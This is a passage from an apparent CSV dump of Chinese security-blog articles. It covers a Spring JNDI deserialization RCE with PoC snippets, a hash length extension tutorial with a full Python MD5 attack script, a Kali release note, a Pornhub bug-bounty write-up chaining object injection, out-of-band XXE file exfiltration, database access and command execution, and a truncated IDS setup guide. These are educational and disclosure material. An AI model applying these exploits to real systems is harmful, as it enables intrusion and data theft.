e){                    e.printStackTrace();                }            }        }).start();            }    }首先javac ExecObj、将生成的class文件放在web服务器目录下。然后依次执行server端，client端运行结果如图：Spring RCESpring RCE形成的主要原因是 Spring框架的spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager 存在一个readObject方法。当执行对象反序列化的时候，会执行lookup操作，导致了jndi注入，可以导致远程代码执行问题，具体原因在这里不分析了，在iswin师傅的博文里有详细的分析。到这里漏洞的成因就比较清晰了，这里的userTransactionName变量我们可以控制，通过setter方法可以初始化该变量，这里userTransactionName可以是rmi的调用地址(例如，userTransactionName=”rmi://127.0.0.1:1999/Object”)，只要控制userTransactionName变量，就可以触发JNDI的RCE，继续跟进lookupUserTransaction方法导致jndi的RCE导致了Spring Framework反序列化的产生关键代码：String jndiAddress = ""rmi://127.0.0.1:1999/Object"";    JtaTransactionManager object = new JtaTransactionManager();    ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());    objectOutputStream.writeObject(object);    objectOutputStream.flush();当我们把这段序列化的对象发送给服务端的时候，就会触发jndi rce漏洞。完整的poc：GitHub参考https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdfhttp://zerothoughts.tumblr.com/](http://zerothoughts.tumblr.com/https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","2016-10-11 15:06:52","Web安全","Jndi注入及Spring RCE漏洞分析","http://nsoad.com/Article/web/20161011/525.html"
"5ccbfb2a4f2f0a0a7a69c121","Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散","silence","Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射， pre-image），通过散列算法，变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来唯一的确定输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。哈希长度扩展攻击简单的来讲就是：1.知道一个密文(SECRET)的哈希2.知道密文的长度(SECRET LENGTH)在不知道密文的情况下可以推算出密文+填充+追加消息(SECRET+PADDING+EXTRA)的哈希，也就是说在只知道密文长度和密文哈希的情况下，可以预测出密文和另一消息拼接后的哈希。0x01 理解哈希算法流程易受哈希长度扩展攻击的哈希算法：SHA系列和MD系列。这两个系列的哈希算法都有一个共同点——基于Merkle–Damgård构造。上图可以看出，Merkle–Damgård算法的流程如下：1. 把消息划分为n个消息块2. 对最后一个消息块做长度填充3. 每个消息块都会和一个输入向量做一个运算，把这个计算结果当成下个消息块的输入向量0x02 理解MD5算法流程了解了Merkle–Damgård算法的流程，下面详细了解一下MD5算法的流程，我们可以参考RFC 1321(http://www.ietf.org/rfc/rfc1321.txt)。MD5算法包括四大步骤：Append Padding Bits(填充bits)Append Length(填充长度)Initialize MD Buffer(初始化向量)Process Message in 16-Word Blocks(复杂的函数运算)我们主要需要了解前三步，也就是MD5算法中的填充和生成初始化向量。首先，我们看一下MD5中填充bits的算法，该算法的流程如下：1. 根据消息的长度确定填充的字节数，即填充后消息长度 mod 512bit = 448bit。举个例子：一个消息是”message”，则这个消息是56bit，所以需要填充392bit。2. 最小填充1bit最多填充512bit，即使消息长度 mod 512 = 448bit。也就是说，不管消息长度是多少，都必须进行填充。3. 填充信息的第一个字节是0x80，剩余数据用0x00填充。然后，我们看一下填充长度的流程：填充长度的大小是64bit长度是小端存储的，也就是说高字节放在高地址中如果消息的长度大于2 ^ 64，也就是大于2048PB。那么64bit无法存储消息的长度，则取低64bit。下图是补位的示例，要进行哈希运算的消息是字符串”message”，则：最后，初始化向量为固定值：A 01 23 45 67 0x67452301B 89 AB CD EF 0xEFCDAB89C FE DC BA 98 0x98BADCFED 76 54 32 10 0x10325476然后，用初始化向量和补位后的消息进行复杂的函数运算，最终得到消息”message”的MD5值为78e731027d8fd50ed642340b7c9a63b3。0x03 理解MD5长度扩展攻击如果一个消息长度大于512bit，则会对消息按512bit进行切分，最后一个消息块进行填充操作。假设我们知道一个7字节也就是56bit的消息的MD5值是78e731027d8fd50ed642340b7c9a63b3。则MD5算法对其进行运算时，会先补位，由于消息的内容我们不知道，所以补位的结果如下图然后会和初始向量进行复杂的函数运算，因为MD5值为78e731027d8fd50ed642340b7c9a63b3，故得到的结果为A=0x0231e778B=0x0ed58f7dC=0x0b3442d6D=0xb3639a7c若向补位后的消息再追加一条消息字符串”admin”，则会对这个字符串进行补位，再利用上一个运算算出的值作为初始向量进行函数运算，最终得到的MD5值为e53a681a30ff99e3f6522270ca7db244。这样就完成了在不知道消息的情况下，计算出消息+填充+追加消息的MD5值。我们可以验证一下，假设验证用户登录的程序是这样的：   import hashlib    import sys    from urllib import unquote     def login(password, hash_val):        m = hashlib.md5()        secret_key = ""message""        m.update(secret_key + password)        if(m.hexdigest() == hash_val):            print ""Login Successful!""        else:            print ""Login Failed""        if __name__ == ""__main__"":        password = unquote(sys.argv[1])        hash_val = unquote(sys.argv[2])        login(password, hash_val)现在只知道一组用户名和hash，root和f3c36e01c874865bc081e4ae7af037ea由分析可知，我们在知道secret_key长度的情况下，可以伪造padding，再通过追加字符串可以算出secret+padding+追加字符串的MD5值。假设我们追加的字符串为admin，则通过哈希扩展攻击计算出md5(secret+padding+追加字符串) = e53a681a30ff99e3f6522270ca7db244。然后我们测试一下，显示登录成功：md5扩展攻击代码如下(网上找的稍作修改，用法：python md5.py 攻击的md5 追加的消息 secret的长度): # coding:utf-8       import sys    import struct    import hashlib    import binascii           def F(x, y, z):        return (x &amp; y) | ((~x) &amp; z)            def G(x, y, z):        return (x &amp; z) | (y &amp; (~z))            def H(x, y, z):        return x ^ y ^ z            def I(x, y, z):        return y ^ (x | (~z))            def _rotateLeft( x, n):        return (x &lt;&lt; n) | (x &gt;&gt; (32-n))            def XX(func, a, b, c, d, x, s, ac):        res = 0L        res = res + a + func(b, c, d)        res = res + x        res = res + ac        res = res &amp; 0xffffffffL        res = _rotateLeft(res, s)        res = res &amp; 0xffffffffL        res = res + b            return res &amp; 0xffffffffL            class md5():        def __init__(self):            self.A, self.B, self.C, self.D = (0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L)            def md5_compress(self, buf):            if len(buf) != 64:                raise ValueError, ""Invalid buffer of length %d: %s"" % (len(buf), repr(buf))            inp = struct.unpack(""I""*16, buf)            a, b, c, d = self.A, self.B, self.C, self.D                # Round 1.            S11, S12, S13, S14 = 7, 12, 17, 22                a = XX(F, a, b, c, d, inp[0], S11, 0xD76AA478L) # 1            d = XX(F, d, a, b, c, inp[1], S12, 0xE8C7B756L) # 2            c = XX(F, c, d, a, b, inp[2], S13, 0x242070DBL) # 3            b = XX(F, b, c, d, a, inp[3], S14, 0xC1BDCEEEL) # 4            a = XX(F, a, b, c, d, inp[4], S11, 0xF57C0FAFL) # 5            d = XX(F, d, a, b, c, inp[5], S12, 0x4787C62AL) # 6            c = XX(F, c, d, a, b, inp[6], S13, 0xA8304613L) # 7            b = XX(F, b, c, d, a, inp[7], S14, 0xFD469501L) # 8            a = XX(F, a, b, c, d, inp[8], S11, 0x698098D8L) # 9            d = XX(F, d, a, b, c, inp[9], S12, 0x8B44F7AFL) # 10            c = XX(F, c, d, a, b, inp[10], S13, 0xFFFF5BB1L) # 11            b = XX(F, b, c, d, a, inp[11], S14, 0x895CD7BEL) # 12            a = XX(F, a, b, c, d, inp[12], S11, 0x6B901122L) # 13            d = XX(F, d, a, b, c, inp[13], S12, 0xFD987193L) # 14            c = XX(F, c, d, a, b, inp[14], S13, 0xA679438EL) # 15            b = XX(F, b, c, d, a, inp[15], S14, 0x49B40821L) # 16                # Round 2.            S21, S22, S23, S24 = 5, 9, 14, 20                a = XX(G, a, b, c, d, inp[1], S21, 0xF61E2562L) # 17            d = XX(G, d, a, b, c, inp[6], S22, 0xC040B340L) # 18            c = XX(G, c, d, a, b, inp[11], S23, 0x265E5A51L) # 19            b = XX(G, b, c, d, a, inp[0], S24, 0xE9B6C7AAL) # 20            a = XX(G, a, b, c, d, inp[5], S21, 0xD62F105DL) # 21            d = XX(G, d, a, b, c, inp[10], S22, 0x02441453L) # 22            c = XX(G, c, d, a, b, inp[15], S23, 0xD8A1E681L) # 23            b = XX(G, b, c, d, a, inp[4], S24, 0xE7D3FBC8L) # 24            a = XX(G, a, b, c, d, inp[9], S21, 0x21E1CDE6L) # 25            d = XX(G, d, a, b, c, inp[14], S22, 0xC33707D6L) # 26            c = XX(G, c, d, a, b, inp[3], S23, 0xF4D50D87L) # 27            b = XX(G, b, c, d, a, inp[8], S24, 0x455A14EDL) # 28            a = XX(G, a, b, c, d, inp[13], S21, 0xA9E3E905L) # 29            d = XX(G, d, a, b, c, inp[2], S22, 0xFCEFA3F8L) # 30            c = XX(G, c, d, a, b, inp[7], S23, 0x676F02D9L) # 31            b = XX(G, b, c, d, a, inp[12], S24, 0x8D2A4C8AL) # 32                # Round 3.            S31, S32, S33, S34 = 4, 11, 16, 23                a = XX(H, a, b, c, d, inp[5], S31, 0xFFFA3942L) # 33            d = XX(H, d, a, b, c, inp[8], S32, 0x8771F681L) # 34            c = XX(H, c, d, a, b, inp[11], S33, 0x6D9D6122L) # 35            b = XX(H, b, c, d, a, inp[14], S34, 0xFDE5380CL) # 36            a = XX(H, a, b, c, d, inp[1], S31, 0xA4BEEA44L) # 37            d = XX(H, d, a, b, c, inp[4], S32, 0x4BDECFA9L) # 38            c = XX(H, c, d, a, b, inp[7], S33, 0xF6BB4B60L) # 39            b = XX(H, b, c, d, a, inp[10], S34, 0xBEBFBC70L) # 40            a = XX(H, a, b, c, d, inp[13], S31, 0x289B7EC6L) # 41            d = XX(H, d, a, b, c, inp[0], S32, 0xEAA127FAL) # 42            c = XX(H, c, d, a, b, inp[3], S33, 0xD4EF3085L) # 43            b = XX(H, b, c, d, a, inp[6], S34, 0x04881D05L) # 44            a = XX(H, a, b, c, d, inp[9], S31, 0xD9D4D039L) # 45            d = XX(H, d, a, b, c, inp[12], S32, 0xE6DB99E5L) # 46            c = XX(H, c, d, a, b, inp[15], S33, 0x1FA27CF8L) # 47            b = XX(H, b, c, d, a, inp[2], S34, 0xC4AC5665L) # 48                # Round 4.            S41, S42, S43, S44 = 6, 10, 15, 21                a = XX(I, a, b, c, d, inp[0], S41, 0xF4292244L) # 49            d = XX(I, d, a, b, c, inp[7], S42, 0x432AFF97L) # 50            c = XX(I, c, d, a, b, inp[14], S43, 0xAB9423A7L) # 51            b = XX(I, b, c, d, a, inp[5], S44, 0xFC93A039L) # 52            a = XX(I, a, b, c, d, inp[12], S41, 0x655B59C3L) # 53            d = XX(I, d, a, b, c, inp[3], S42, 0x8F0CCC92L) # 54            c = XX(I, c, d, a, b, inp[10], S43, 0xFFEFF47DL) # 55            b = XX(I, b, c, d, a, inp[1], S44, 0x85845DD1L) # 56            a = XX(I, a, b, c, d, inp[8], S41, 0x6FA87E4FL) # 57            d = XX(I, d, a, b, c, inp[15], S42, 0xFE2CE6E0L) # 58            c = XX(I, c, d, a, b, inp[6], S43, 0xA3014314L) # 59            b = XX(I, b, c, d, a, inp[13], S44, 0x4E0811A1L) # 60            a = XX(I, a, b, c, d, inp[4], S41, 0xF7537E82L) # 61            d = XX(I, d, a, b, c, inp[11], S42, 0xBD3AF235L) # 62            c = XX(I, c, d, a, b, inp[2], S43, 0x2AD7D2BBL) # 63            b = XX(I, b, c, d, a, inp[9], S44, 0xEB86D391L) # 64                self.A = (self.A + a) &amp; 0xffffffffL            self.B = (self.B + b) &amp; 0xffffffffL            self.C = (self.C + c) &amp; 0xffffffffL            self.D = (self.D + d) &amp; 0xffffffffL            # print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D))            def padding(self, n, sz=None):            if sz is None:                sz = n            pre = 64-8            sz = struct.pack(""Q"",sz*8)            pad = '\x80'            n += 1            if n % 64 &lt;= pre:                pad += '\x00' * (pre - n % 64)                pad += sz            else:                pad += '\x00' * (pre + 64 - n % 64)                pad += sz            return pad            def pad(self, msg):            return msg + self.padding(len(msg))            def md5_iter(self, padding_msg):            assert len(padding_msg) % 64 == 0            for i in range(0, len(padding_msg), 64):                block = padding_msg[i:i+64]                self.md5_compress(padding_msg[i:i+64])            def digest(self):            return struct.pack('&lt;IIII', self.A, self.B, self.C, self.D) def hexdigest(self): return binascii.hexlify(self.digest()).decode() def my_md5(self, msg): padding_msg = self.pad(msg) self.md5_iter(padding_msg) return self.hexdigest() # 通过md5值，逆向算出最后一轮的magic number def compute_magic_number(self, md5str): self.A = struct.unpack(""I"", md5str[0:8].decode('hex'))[0] self.B = struct.unpack(""I"", md5str[8:16].decode('hex'))[0] self.C = struct.unpack(""I"", md5str[16:24].decode('hex'))[0] self.D = struct.unpack(""I"", md5str[24:32].decode('hex'))[0] #print 'A=%s\nB=%s\nC=%s\nD=%s\n' % (hex(self.A), hex(self.B), hex(self.C), hex(self.D)) def extension_attack(self, md5str, str_append, lenth): self.compute_magic_number(md5str) p = self.padding(lenth) padding_msg = self.padding( len(str_append), lenth + len(p) + len(str_append) ) self.md5_iter(str_append + padding_msg) return self.hexdigest() if __name__ == ""__main__"": m = md5() if len(sys.argv) != 4: #print m.my_md5(""123456"") src = m.pad(sys.argv[1]) + sys.argv[2] print 'md5 padding -&gt;',m.my_md5(src)        else:            print 'md5 extension_attack -&gt;',m.extension_attack(sys.argv[1], sys.argv[2], int(sys.argv[3]))0x04 总结这个攻击方式的原理是，知道一个密文的md5和密文的长度，可以推算出密文与扩展消息拼接后的md5。防范方法也很简单：方法1：用HMAC算法 HMAC(secret||padding)=H(secret||H(secret||padding))方法2：交换secret和padding的位置，即MAC(padding||secret)通常md5可以作为签名来用，曾经有两个漏洞，亚马逊AWS和Flicker的签名漏洞，均可以通过md5哈希长度扩展攻击。最近也有一个phpwind的洞可用哈希长度扩展攻击。不过现在这个攻击方式的发展趋势应该是活在CTF中了233333 0x05 引用http://www.ietf.org/rfc/rfc1321.txthttp://blog.chinaunix.net/uid-27070210-id-3255947.html","2016-09-18 11:35:34","Web安全","哈希长度扩展攻击","http://nsoad.com/Article/web/20160918/410.html"
"5ccbfb2a4f2f0a0a7a69c122","当我们要对一个目标进行渗透时，我们往往需要去尽可能的挖掘目标可能存在的攻击面。就拿一个域名来说，当主站防御的比较死的时候，我们通常就会考虑其子站。","houjingyi","终于更新了！Kali官方近日正式宣布推出Kali Linux 2017.1滚动发行版，它带来了一系列令人兴奋的更新和功能。与所有新版本一样，您可以使用更新的软件，提供更多更好的硬件支持的更新的内核以及一系列更新的工具——同时这个版本还有一些惊喜。支持RTL8812AU无线网卡注入不久之前，我们收到了一个安装RTL8812AU无线芯片组的驱动程序的功能请求。这些驱动程序不是标准Linux内核的一部分，并且已被修改为允许注入。为什么这很重要呢？该芯片组支持802.11 AC，使得它成为第一批能进行注入相关的无线攻击的驱动之一，而像ALFA这样的公司制造 AWUS036ACH无线网卡，我们预计这张卡将成为武器库的最爱。可以使用以下命令安装驱动程序：apt-get update apt install realtek-rtl88xxau-dkms简化支持CUDA GPU Crack安装专有图形驱动程序一直是Kali的沮丧之源。幸运的是，打包过程的改进使得这个过程无缝——我们的用户在GPU破解的过程中获得了流线型的体验。通过搭配支持的硬件，像Hashcat和Pyrit这样的工具可以充分利用Kali内的NVIDIA GPU。有关此新功能的更多信息，请查看相关博客文章和更新的官方文档。Amazon AWS和Microsoft Azure可用性（GPU支持）由于基于云进行密码破解的日益普及，我们决定将精力放在精简Kali的方法上。我们注意到亚马逊的AWS P2系列和Microsoft的Azure NC系列允许直接通过GPU支持，因此我们制作了kali相应的AWS和Azure镜像，支持CUDA GPU开箱即用。您可以在几周前发布的Cracking in the Cloud with CUDA GPUs获取更多信息。OpenVAS 9封装在Kali存储库中Kali(以及许多开源镜像)中最缺乏的工具类别之一是一个完全成熟的漏洞扫描程序。我们最近打包了OpenVAS 9(连同众多的依赖关系)，并且很高兴地说，在我们看来，OpenVAS项目已经日益成熟。由于占用空间庞大，我们仍然不将OpenVAS包含在默认的Kali版本中，但OpenVAS可以使用以下命令轻松下载并安装：apt-get update apt install openvasKali Linux相关的书和在线课程对于关心我们最近公布的关于Kali Linux专业认证计划的人来说，我们很高兴地说，我们正在按时完成任务。Kali Linux Revealed将在七月初上市，并且在那之后不久会发布免费的在线版本。我们对这本书和在线课程感到非常兴奋，并急切地等待这个版本——这标志着我们的真正基石，因为我们的项目继续发展壮大。获得有关本书和在线课程的最新消息，请务必在Twitter上关注我们。2007年Black Hat Vegas的Kali Linux今年，我们很幸运第一个官方的Kali Linux培训在2017年拉斯维加斯的黑帽会议上首次亮相。这个深入的四天课程将重点关注Kali Linux平台本身(而不是工具或者渗透测试技术)，并帮助您理解并最大限度地从头开始使用Kali。由Mati Aharoni和Johnny Long提供的这个为期四天的课程中，您将学习成为一名Kali Linux高手。我们今年也将举办另一场Dojo活动——稍后会有更多的细节。Kali ISO下载，虚拟机和ARM镜像Kali Rolling 2017.1版本可以通过我们官方的Kali下载页面下载。我们的存储库最近已更新，支持HTTPS以及HTTPS apt传输。这个版本中，我们还更新了我们的Kali Virtual Images和Kali ARM Images下载。像往常一样，如果你已经安装了Kali，你需要做的全部更新就是：apt update apt-dist reboot","2017-05-06 13:46:41","安全工具","Kali linux发布新版本了，一起来看看都有什么新功能吧","http://nsoad.com/Security-tools/20170506/tools-1145.html"
"5ccbfb2a4f2f0a0a7a69c123","几个月前，我正在计划一个悠长的假期，因此想找一些零花钱。Pornhub的漏洞赏金计划和它高额的奖励成功引起了我的注意。并且，去黑一个像Pornhub的站是一个真的很炫酷的事情。","silence","几个月前，我正在计划一个悠长的假期，因此想找一些零花钱。Pornhub的漏洞赏金计划和它高额的奖励成功引起了我的注意。并且，去黑一个像Pornhub的站是一个真的很炫酷的事情。文章太长，请谨慎阅读。这是关于我如何成功在www.pronhub.com上执行命令。我利用视频上传的callback字段，然后能够成功的在多个Pornhub的站点上去执行一个精心构造过形式的对象注入。通过在一个特定的流中使用SimpleXMLElement类，我能够去执行一个OOB（带外数据） XXE攻击，如此一来，我可以获取到服务器上所有私有的，本地的文件全部内容。除了本地文件泄露而外，通过对已创建类的轻微修改，我也能够去在服务器上达到下列核心的能力：SSRFBlind SQL执行（在每一个Pornhub的数据库上执行SQL语句，无命令结果回显）通过利用这三个点的组合，我最终能够在pornhub.com执行任意的代码。 完整路径的泄露和一些反序列化Pornhub是一个基于账户的服务网站，作为网站一个重要的特性，它必须可以上传文件到服务器上。在黑客的眼中，文件上传是一种最主要的攻击面，通常来讲是潜在导致利用的点。我决定去研究下pornhub.com这个允许注册用户上传图片作为个人图片的特性功能。服务器成功地取消了我大多数操作文件的琐屑尝试。图片一旦被上传，Pornhub会把上传的图片剪切到一个有效的大小（为了适应用户页面的模板）。一旦我上传图片，尝试去剪切图片，我成功的导致了服务器显示如下的异常信息：{""success"":""ERROR"",""message"":""Unable to make handle from: \/home\/web1\/upload.pornhub.com\/htdocs\/temp\/images\/1517\/avatarOriginal158936891.png""}.正如你能清晰从这个高度描述性的错误性信息中所看见的那样，这个异常信息泄露了我上传文件的完整路径信息：/home/web1/upload.pornhub.com/htdocs/temp/images/1517/avatarOriginal158936891.png既然我能够去使我上传的图片特定的物理路径泄露，我就有了一个在服务器上我可以支配的可写的目录了。悲剧的是，在联系Pornhub团队报告了这个问题后，他们回复说早前已经有另一个研究人员报告了相同的问题了...在我更加细致深入的去研究pornhub的上传特性后，我成功地发现服务器会接受一个Cookie作为上传的字段。这个Cookie字段默认包含着一个序列化的用户cookies的PHP数组。显然，负责去处理上传文件的代码最终列举出在列表里面的成员，如果一个特殊的成员不存在于Request的Cookie header中，就添加一个HTTP set-cookie的头。令我纠结的事情却恰好是一个完全来自于用户输入的实用的反序列化利用。为了去扩宽我的攻击向量 - 我需要一个有__toString方法的类（在PHP中，当一个对象转换为字符串时，会自动去调用）基于我是处于一个黑盒状态下的利用研究 - 我显然没有源代码 - 所以我丝毫不熟悉pornhub运用了哪些php的类，我只能强行去使用原生PHP的内建类。不幸的是，我没能找到任何有__toString方法不需要去调用类的构造函数的类。所以，我决定放弃这个点，尽管它有巨大的潜在威胁。虽然这个点对于我来说一定程度上基本没啥用，但是那些盆友们发现这个非常有用：https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/他们非常幸运！我没能找到如何更好利用这个点的方法，所以我并没有报告这个“来自用户的反序列化”问题。 上传视频以及有趣的callback作为朝着RCE的下一个台阶，我决定去集中注意力在视频上传功能上，出于和上文所详细介绍的原因一样，我继续关注了上传处。正如之前的文件上传，我所有去利用上传功能的尝试都遭受了惨痛的失败 - pornhub 确实知道如何在部分程度上保护他们的服务器，避免来自用户上传文件的安全威胁。然而，在我尝试的过程中，我发现一个有趣的字段，这个字段叫“callbackUrl”，更确信的是这个字段里包含着一个相当有趣的URL。自然而然，我尝试去访问这个URL，然后得到了一个异常信息：”job” is invalid。我决定进一步深入去探索下这个job的字段。我将callbackURL中的URL改为我自己的URL，希望则个字段可以被使用而不是一个白名单字段。令人感到惊喜的是，在改变了这个URL为我自己本地服务器后，我得到了一个连接：这看上去像一个潜在的SSRF，但是这个请求的源是一个第三方的服务器，并非和pornhub有关的域名或者在Pornhub的IP范围中。这意味着，我可能没办法通过它去访问pornhub内部的服务，而且研究一个第三方的站点有点超出范围了。无论如何，这个请求给了我关于这个让人期待的job字段的结构的重要信息。似乎job是一个非常长的JSON数组，具体说明了上传文件来提供给更进一步的处理，或许是编码。我的第一次尝试是去操作这个Json来上传一个php shell，但是我失败了，我都几乎准备要放弃这次行动了...直到... 对象注入？我开始检测这个Json当中的“type”成员，它看上去像一个类的名字。我改变它并发送Json到原有的URL。发现结果相当令人惊喜：接收到的响应说明了类不存在。这让我得到了一个结论：这是一个类的名称，那么我就有一定可能去执行对象注入。不幸的是，此时此刻一个对象注入事实上是没可能的...Soapclient：个人而言，Soapclient是我在处理反序列化数据时最爱的选择：在大部分情况下，它具有暴露关于系统行为的重要信息的潜能（例如：方法名，字段），并且通常允许返回你想获得任何的值，甚至输入那些程序猿从来不打算提供的。 ""SoapClient::SoapClient(): $wsdl must be string or null""这是一个不寻常的错误，因为它是一个构造函数的错误，并不应该在反序列化中调用，这很可能引导我们去相信另一个事实：Pornhub使用着他们自己的反序列化方法。我尝试着去理解这个不熟悉的反序列化原理是如何去工作的，通过多次不同的尝试，我获得了一些具有提示性的错误，我发现我能够控制所有发送给构造方法的参数。有了这样的发现，我能够创建一个SoapClient设置在我的服务端上的请求，从而取代原有的类。请求：我服务端上接收到的请求：通过使用SoapClient，我现在有能力去：进行SSRF （服务端请求伪造）获取到服务端PHP准确的版本信息（返回信息说明服务器PHP的版本为5.6.17）使用函数来调用原有的类（getResult，无需字段）我尝试去获得“getResult”的更多的结果，但是每次都失败了。为了去扩宽我的攻击面，我猜测应该有一种比SoapClient更好的类，所以我试了试使用PHP的默认DirectoryIterator类。请求和根目录的返回信息：此时，我本不能访问根目录，但感谢对象注入与DirectoryIterator，我成功的发现了所有“/”下目录的准确列表，并且检测一个目录是否存在。我尝试将DirectoryIterator放入SoapClient中，但失败了，似乎并不是所有Json当中的成员都会被作为对象进行解码。 SQLite和PDO我偶然发现SQLite3类，其中存在一个filename的字段。我尝试去使用在第一个漏洞中发现的可写的路径，这样我就能够创建一个空文件了。为啥是个空文件呢？简单来说，因为我需要它去执行语句，并在这个文件中插入内容（把它当作一个shell来用）。我需要去调用一个附加的函数来执行实际的语句，来写入文件之中，但是这没有什么可能。我又试图从PDO中寻找，作为一个潜在的类注入，然而我意识到它依然和SQLite3的类差不多。尽管我已经被上面的结果折磨的累觉不爱了，但我继续寻找到PHP中另一个有用的内建类。 SimpleXMLElement作为最后一个手段，我决定好好的去看看原生的SimpleXMLElement类，在黑客术语当中，XML是几乎立刻就能和XXE关联起来的。然而，正如我之前成功获取到安装在这台服务器的PHP版本5.6.17，这个版本的SimpleXMLElement的类，已经成功免疫XXE攻击 - 如果一个外部的实体存在，这个类就会抛出异常并且停止XML处理。因此，我机智的认识到一个基本的XXE在现在这个情况下毫无用处了。除了对于XXE利用到目前为止这点可怜的成功，SimpleXMLElement构造函数包含了一个可选择的字段，叫“options”，它是用来指定额外的Libxml字段。这其中有一个字段是“LIBXML_DTDLOAD” - 这个在稍后使我能够去加载外部的DTD并且使用XXE带外数据攻击。在加强了我的XML技能并且实施了无数种的尝试后，我成功的获得了我的第一个文件！！！我最终运行了两个服务器，一个是XML的，第二个是用来接受文件的（使用了NetCat，因为大多数的文件都太大，对于一般的服务器不能通过URL来接收）第一个XML包含了两个外部的字段实体：第一个xml.xml是用来读取远程文件源码的第二个xml2.xml是得到xml.xml读取到的代码并发起一个请求到本地服务器（这样我们就可以获取到Pornhub的代码了）总结下，我攻击的步骤：1.向Pornhub的服务器发送一个Post请求2.Pornhub的服务器下载第一个xml文件，即：xml.xml3.Pornhub的服务器下载第二个xml文件，即：xml2.xml4.Pornhub的服务器发送一个Get请求到第二个服务器的URL，其中带有一个a字段，负责存放base64之后Pornhub服务器上的本地文件 获取配置文件从此刻开始以后，我的黑盒状态下的研究变成了在白盒状态下研究了，此时，我觉得是时候联系pornhub.com，与他们分享我的发现了。当我准备把发现报告给Pornhub之时，我下载了他们部分的资源，偶然发现了pornhub的注数据库凭证信息。PDO的MySQL驱动有个""PDO::MYSQL_ATTR_INIT_COMMAND""选项，它允许我通过PDO的构造方法来执行语句。在我获取到了连接字符串后，我能够去发送带有PDO类的请求，从而在Pornhub的数据库上执行任何的语句了。这个发现稍后被加入到了第一个报告之中。 www.pornhub.com 代码执行现在我是有了pornhub全站新鲜代码武装的人了，而且还能够完全访问pornhub的数据库，我猜测对于我去找到一个主站的远程代码执行将会变得相当容易。好吧，还是没那么容易的。我在GIF产生的原理中找到了调用PHP exec函数的点：显然，你可以从pornhub.com的任何一个视频中制作一个GIF，并且这个视频的文件路径是从数据库中获得的，并且没有任何形式的转义。在我成功进行这之前，Pornhub团队已经禁掉了upload.pronhub.com上的URL，从而来暂时避免这个漏洞造成危害（根据我提供给他们的第一份报告），但是www.pornhub.com上的URL还是可以访问的。可是，这个网站禁止了向外部的连接。所以，我不能获取更多的泄露信息。为了我在pornhub.com上即将到来的RCE的POC，我将数据库中的“filename”改为了’sleep 60’，可是我忽视掉了主数据库有一个30分钟的缓存...在我耐心的等候更新的时候，我使用最新发现的SQLite和DirectoryIterator原生类注入来寻找可写的路径，但是一无所获。我一直尝试着去执行一个命令并从数据库得到结果，在我测试的过程中，Pornhub团队封锁了这个URL，因而我只能以一个没有结果的成功的远程代码执行来作为我整个研究的总结（先前写的‘sleep’命令在数据库缓存更新后确实执行了）。这个远程代码执行的详细细节，也被我添加进了我之前提供给pornhub.com的报告之中。 总结对象注入，与SQL注入相比，显得相对陌生。开发人员总是没有意识到它们也可能造成危险的漏洞，所以难得去确保他们的代码在此类问题上的安全性。然而，如果被正确的使用，它们可以帮助研究者发现无数的利用点。就我这个例子而言，这个问题给了我充足经费去我一直以来需要的国外度假，但是也帮助我证实了一点 - 如果你全心全意在一个目标上，你就可以实现它！（或者以我的例子来说 - 黑掉这无法无边的pornhub.com） 时间线：2016-05-10 - 发现反序列化 - 没有报告2016-05-15 - 报告路径泄露2016-06-01 - 报告文件泄露2016-06-02 - 添加：整个数据库控制2016-06-06 - 添加：代码执行2016-07-06 - 10,000$ 来自pornhub的奖金2016-09-12 - Pornhub 修复了问题2016-10-03 - 报告被公开","2016-10-09 11:33:50","Web安全","我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金","http://nsoad.com/Article/web/20161009/506.html"
"5ccbfb2a4f2f0a0a7a69c124","前言本文以构建一套完整的入侵检测系统为目的，配合使用多款开源软件快速搭建起包含流量监控、攻击溯源、实时告警等功能的框架。其中告警能高度自由定制，不再局限于传统的","kong","前言本文以构建一套完整的入侵检测系统为目的，配合使用多款开源软件快速搭建起包含流量监控、攻击溯源、实时告警等功能的框架。其中告警能高度自由定制，不再局限于传统的Web页面告警，邮件告警。文中，会提供两个例子来帮助大家理解如何去配置告警任务。1. 入侵行为识别入侵检测有着使用许多开源的IDS，这里我们以Suricata为例。Suricata是一个高性能的网络IDS，IPS和网络安全监控引擎，它可以兼容snort规则同时是多线程的IDS，我们通过官方提供的文档快速安装上。 https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Quick_Start_Guide安装完成后，在/etc/suricata/suricata.yaml 配置下：在15行设置 HOME_NET为本机ip或所在段，是监控的目标网域 在217行把“- flow”注释掉 ，以免数据过多sudo suricata -c /etc/suricata/suricata.yaml -i eth0运行后我们将会在 /var/log/suricata/eve.json 文件中得到JSON格式的IDS日志。2. 日志平台为了便于后续的攻击日志分析，自然需要对数据进行入库方便我们查询。IDS大都部署在网关上，数据量非常客观，对于日志信息的大数据处理，目前最流行的便是ELK Stack。 Logstash：负责日志的收集，处理和储存Elasticsearch：负责日志检索和分析Kibana：负责日志的可视化写本文时，ELK Stack已经更新了5.0正式版，统一了elasticsearch，logstash，kibana间版本命名问题，同时对Shield, Watcher, Marvel,Graph几个扩展插件经行了封装打包，形成了X-PACK。 安装过程同样略过，在完成ELK及X-PACK的安装后，启动服务：systemctl start elasticsearch.servicesystemctl start kibana.service注意:安装X-PACK后，elasticsearch和kibana将会开启用户验证，默认用户elastic密码changeme 在/etc/kibana/kibana.yml中需要配置账号并重启kibana服务：elasticsearch.username: “elastic” elasticsearch.password: 